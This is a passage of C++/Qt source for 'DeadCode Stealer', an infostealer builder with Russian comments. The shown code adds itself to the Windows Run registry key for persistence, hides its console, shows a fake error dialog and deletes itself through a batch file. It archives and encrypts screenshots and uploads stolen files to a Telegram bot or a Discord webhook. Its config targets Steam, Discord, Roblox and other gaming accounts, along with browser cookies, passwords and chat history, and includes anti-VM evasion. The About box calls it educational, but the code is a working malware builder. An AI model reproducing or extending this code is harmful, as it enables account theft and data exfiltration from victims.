}

// Скрытность
void MainWindow::Stealth() {
    if (!config.silent) {
        emitLog("Режим скрытности отключен в конфигурации");
        return;
    }

    emitLog("Применение режима скрытности...");

    // Скрытие окна консоли
    HWND hwnd = GetConsoleWindow();
    if (hwnd != nullptr) {
        ShowWindow(hwnd, SW_HIDE);
        emitLog("Консольное окно скрыто");
    }

    // Уменьшение следов в системе (пример: удаление временных файлов)
    try {
        std::filesystem::remove_all(std::string(getenv("TEMP")) + "\\DeadCodeTemp");
        emitLog("Временные следы удалены");
    } catch (const std::exception& e) {
        emitLog("Ошибка при удалении временных следов: " + QString::fromStdString(e.what()));
    }
}

// Персистентность
void MainWindow::Persist() {
    if (!config.persist) {
        emitLog("Персистентность отключена в конфигурации");
        return;
    }

    emitLog("Применение персистентности...");

    // Добавление в автозагрузку через реестр
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(nullptr, exePath, MAX_PATH);
        if (RegSetValueExA(hKey, "DeadCode", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
            emitLog("Программа добавлена в автозагрузку через реестр");
        } else {
            emitLog("Ошибка добавления в автозагрузку через реестр");
        }
        RegCloseKey(hKey);
    } else {
        emitLog("Ошибка открытия ключа реестра для персистентности");
    }
}

// Фейковая ошибка
void MainWindow::FakeError() {
    if (!config.fakeError) {
        emitLog("Фейковая ошибка отключена в конфигурации");
        return;
    }

    emitLog("Отображение фейковой ошибки...");

    QMessageBox::critical(this, "Критическая ошибка", "Приложение столкнулось с критической ошибкой и будет закрыто.\nКод ошибки: 0x80000003");
    emitLog("Фейковая ошибка отображена");
}

// Самоуничтожение
void MainWindow::SelfDestruct() {
    emitLog("Выполнение самоуничтожения...");

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    // Создаем батник для удаления
    std::string batchPath = std::string(getenv("TEMP")) + "\\delete.bat";
    std::ofstream batchFile(batchPath);
    if (batchFile.is_open()) {
        batchFile << "@echo off\n";
        batchFile << "timeout /t 1 /nobreak > nul\n";
        batchFile << "del \"" << exePath << "\"\n";
        batchFile << "del \"%~f0\"\n";
        batchFile.close();

        // Запускаем батник
        ShellExecuteA(nullptr, "open", batchPath.c_str(), nullptr, nullptr, SW_HIDE);
        emitLog("Самоуничтожение инициировано");
    } else {
        emitLog("Ошибка создания батника для самоуничтожения");
    }

    // Завершаем процесс
    exit(0);
}

// Создание архива
void MainWindow::archiveData(const std::string& dir, const std::string& archivePath) {
    emitLog("Создание архива данных...");

    int err = 0;
    zip_t* zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив: " + QString::number(err));
        return;
    }

    try {
        for (const auto& filePath : screenshotsPaths) {
            std::string fileName = std::filesystem::path(filePath).filename().string();
            zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
            if (!source) {
                emitLog("Ошибка: Не удалось добавить файл в архив: " + QString::fromStdString(filePath));
                continue;
            }
            if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                zip_source_free(source);
                emitLog("Ошибка: Не удалось добавить файл в архив: " + QString::fromStdString(filePath));
            }
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при создании архива: " + QString::fromStdString(e.what()));
    }

    zip_close(zip);
    emitLog("Архив создан: " + QString::fromStdString(archivePath));
}

// Шифрование данных
void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath) {
    emitLog("Шифрование данных...");

    std::ifstream inFile(inputPath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath));
        return;
    }

    std::vector<char> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    QByteArray byteData(data.data(), data.size());
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);
    auto iv = generateIV();

    // Применяем XOR
    QByteArray xorData = applyXOR(byteData, key1);

    // Применяем AES
    QByteArray encryptedData = applyAES(xorData, key2, iv);
    if (encryptedData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные");
        return;
    }

    // Сохраняем IV + зашифрованные данные
    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось сохранить зашифрованные данные: " + QString::fromStdString(outputPath));
        return;
    }

    outFile.write((char*)iv.data(), iv.size());
    outFile.write(encryptedData.constData(), encryptedData.size());
    outFile.close();

    emitLog("Данные зашифрованы: " + QString::fromStdString(outputPath));
}

// Отправка данных (обновленная реализация)
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    emitLog("Отправка данных...");

    if (files.empty()) {
        emitLog("Ошибка: Нет файлов для отправки");
        return;
    }

    // В зависимости от метода отправки вызываем соответствующий метод
    if (config.sendMethod == "Telegram") {
        for (const auto& filePath : files) {
            sendToTelegram(filePath);
        }
    } else if (config.sendMethod == "Discord") {
        for (const auto& filePath : files) {
            sendToDiscord(filePath);
        }
    } else if (config.sendMethod == "Local File") {
        for (const auto& filePath : files) {
            saveToLocalFile(filePath);
        }
    } else {
        emitLog("Ошибка: Неизвестный метод отправки: " + QString::fromStdString(config.sendMethod));
    }

    emitLog("Отправка данных завершена");
}

// Отправка в Telegram
void MainWindow::sendToTelegram(const std::string& filePath) {
    emitLog("Отправка файла в Telegram: " + QString::fromStdString(filePath));

    if (config.telegramToken.empty() || config.chatId.empty()) {
        emitLog("Ошибка: Telegram Token или Chat ID не указаны");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, filePath.c_str());
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, config.chatId.c_str(), CURL_ZERO_TERMINATED);

    std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: multipart/form-data");

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "DeadCode-Stealer/1.0");

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
        QJsonObject obj = doc.object();
        if (obj["ok"].toBool()) {
            emitLog("Файл успешно отправлен в Telegram: " + QString::fromStdString(filePath));
        } else {
            emitLog("Ошибка Telegram API: " + QString::fromStdString(obj["description"].toString().toStdString()));
        }
    }

    curl_slist_free_all(headers);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}

// Отправка в Discord
void MainWindow::sendToDiscord(const std::string& filePath) {
    emitLog("Отправка файла в Discord: " + QString::fromStdString(filePath));

    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Discord Webhook не указан");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Discord");
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, filePath.c_str());

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: multipart/form-data");

    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "DeadCode-Stealer/1.0");

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки в Discord: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        emitLog("Файл успешно отправлен в Discord: " + QString::fromStdString(filePath));
    }

    curl_slist_free_all(headers);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}

// Сохранение в локальный файл
void MainWindow::saveToLocalFile(const std::string& filePath) {
    emitLog("Сохранение файла локально: " + QString::fromStdString(filePath));

    std::string destPath = "output/" + std::filesystem::path(filePath).filename().string();
    try {
        std::filesystem::create_directories("output");
        std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл сохранен локально: " + QString::fromStdString(destPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка сохранения файла локально: " + QString::fromStdString(e.what()));
    }
}

// Сохранение конфигурации
void MainWindow::saveConfig(const QString& fileName) {
    emitLog("Сохранение конфигурации...");

    QString configFile = fileName.isEmpty() ? "config.ini" : fileName;
    QSettings settings(configFile, QSettings::IniFormat);

    settings.beginGroup("General");
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("telegramToken", QString::fromStdString(config.telegramToken));
    settings.setValue("chatId", QString::fromStdString(config.chatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.endGroup();

    settings.beginGroup("Features");
    settings.setValue("discord", config.discord);
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("telegram", config.telegram);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("selfDestruct", config.selfDestruct);
    settings.endGroup();

    emitLog("Конфигурация сохранена в: " + configFile);
}

// Загрузка конфигурации
void MainWindow::loadConfig() {
    emitLog("Загрузка конфигурации...");

    QSettings settings("config.ini", QSettings::IniFormat);
    if (!QFile::exists("config.ini")) {
        emitLog("Файл конфигурации не найден, используются значения по умолчанию");
        return;
    }

    settings.beginGroup("General");
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.telegramToken = settings.value("telegramToken", "").toString().toStdString();
    config.chatId = settings.value("chatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "DeadCode.exe").toString().toStdString();
    config.encryptionKey1 = settings.value("encryptionKey1", "").toString().toStdString();
    config.encryptionKey2 = settings.value("encryptionKey2", "").toString().toStdString();
    config.encryptionSalt = settings.value("encryptionSalt", "").toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
    settings.endGroup();

    settings.beginGroup("Features");
    config.discord = settings.value("discord", false).toBool();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();
    settings.endGroup();

    // Обновляем UI
    sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    tokenLineEdit->setText(QString::fromStdString(config.telegramToken));
    chatIdLineEdit->setText(QString::fromStdString(config.chatId));
    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    fileNameLineEdit->setText(QString::fromStdString(config.filename));
    encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
    encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
    encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
    iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));

    discordCheckBox->setChecked(config.discord);
    steamCheckBox->setChecked(config.steam);
    steamMAFileCheckBox->setChecked(config.steamMAFile);
    epicCheckBox->setChecked(config.epic);
    robloxCheckBox->setChecked(config.roblox);
    battlenetCheckBox->setChecked(config.battlenet);
    minecraftCheckBox->setChecked(config.minecraft);
    cookiesCheckBox->setChecked(config.cookies);
    passwordsCheckBox->setChecked(config.passwords);
    screenshotCheckBox->setChecked(config.screenshot);
    fileGrabberCheckBox->setChecked(config.fileGrabber);
    systemInfoCheckBox->setChecked(config.systemInfo);
    socialEngineeringCheckBox->setChecked(config.socialEngineering);
    chatHistoryCheckBox->setChecked(config.chatHistory);
    telegramCheckBox->setChecked(config.telegram);
    antiVMCheckBox->setChecked(config.antiVM);
    fakeErrorCheckBox->setChecked(config.fakeError);
    silentCheckBox->setChecked(config.silent);
    autoStartCheckBox->setChecked(config.autoStart);
    persistCheckBox->setChecked(config.persist);

    emitLog("Конфигурация загружена из config.ini");
}

// Экспорт логов
void MainWindow::exportLogs() {
    emitLog("Экспорт логов...");

    QString filePath = QFileDialog::getSaveFileName(this, "Экспорт логов", "logs.txt", "Text Files (*.txt)");
    if (filePath.isEmpty()) {
        emitLog("Экспорт логов отменен пользователем");
        return;
    }

    QFile file(filePath);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emitLog("Ошибка: Не удалось открыть файл для экспорта логов: " + filePath);
        return;
    }

    QTextStream out(&file);
    out << textEdit->toPlainText();
    file.close();

    emitLog("Логи экспортированы в: " + filePath);
}

// Завершение приложения
void MainWindow::exitApp() {
    emitLog("Завершение приложения...");
    QApplication::quit();
}

// Отображение информации о программе
void MainWindow::showAbout() {
    emitLog("Отображение информации о программе...");

    QMessageBox::about(this, "О программе",
                       "DeadCode Stealer\n"
                       "Версия: 1.0.0\n"
                       "Разработчик: xAI\n"
                       "Описание: Учебное приложение для демонстрации методов защиты и анализа.\n"
                       "© 2025 xAI. Все права защищены.");
}

// Обработчик ответа от сети
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() != QNetworkReply::NoError) {
        emitLog("Ошибка сети: " + reply->errorString());
    } else {
        emitLog("Сетевой запрос успешно выполнен");
    }
    reply->deleteLater();
}

// Добавление лога в текстовое поле
void MainWindow::appendLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
}

// Обработчик нажатия кнопки сборки
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
        return;
    }

    updateConfigFromUI();
    generatePolymorphicCode();
    generateBuildKeyHeader();
    copyIconToBuild();

    if (config.buildMethod == "Local Build") {
        buildTimer->start(100);
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    }
}

// Обработчик выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString iconPath = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!iconPath.isEmpty()) {
        iconPathLineEdit->setText(iconPath);
        config.iconPath = iconPath.toStdString();
        emitLog("Иконка выбрана: " + iconPath);
    }
}

// Обработчик сохранения конфигурации
void MainWindow::on_actionSaveConfig_triggered() {
    QString fileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "config.ini", "INI Files (*.ini)");
    if (!fileName.isEmpty()) {
        saveConfig(fileName);
    }
}

// Обработчик загрузки конфигурации
void MainWindow::on_actionLoadConfig_triggered() {
    QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "INI Files (*.ini)");
    if (!fileName.isEmpty()) {
        saveConfig(fileName + ".backup"); // Создаем резервную копию текущей конфигурации
        loadConfig();
    }
}

// Обработчик экспорта логов
void MainWindow::on_actionExportLogs_triggered() {
    exportLogs();
}

// Обработчик выхода
void MainWindow::on_actionExit_triggered() {
    exitApp();
}

// Обработчик отображения информации о программе
void MainWindow::on_actionAbout_triggered() {
    showAbout();
}